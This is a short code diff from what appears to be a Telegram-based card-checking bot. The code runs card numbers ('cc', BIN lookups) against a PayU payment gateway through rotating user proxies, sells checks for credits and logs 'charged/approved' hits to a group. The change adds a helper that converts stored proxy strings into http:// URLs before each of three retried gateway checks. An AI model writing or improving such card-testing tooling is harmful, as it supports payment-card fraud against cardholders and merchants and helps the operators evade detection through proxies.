@@ -21,6 +21,18 @@ from database import is_gate_enabled, get_user_credits, update_credits, get_db_c
 from bin import get_bin_info
 from sub import get_premium_status
 from proxy_pool import get_user_proxies
+from proxy import parse_proxy_input
+
+
+def _norm_proxy(proxy):
+    """DB stores proxies as 'user pass ip port'; convert to a clean http:// URL."""
+    try:
+        parsed = parse_proxy_input(proxy)
+        if parsed and parsed.get("url_format"):
+            return parsed["url_format"]
+    except Exception:
+        pass
+    return proxy
 from mass_gates._tg_helpers import safe_reply, send_hit
 
 # silent group log for PayU hits (charged/approved -> this group + pinned)
@@ -209,7 +221,7 @@ async def process_pu_check(message, proc_msg, user, user_id, formatted_cc, cc, p
         api_result = {"status": "error", "response": "NO_PROXY", "real_response": "NO_PROXY", "amount": "0.00"}
     else:
         for _attempt in range(3):
-            proxy = random.choice(user_proxies)
+            proxy = _norm_proxy(random.choice(user_proxies))
             try:
                 api_result = await asyncio.to_thread(_pu_api_check, formatted_cc, proxy, amount)
             except Exception:
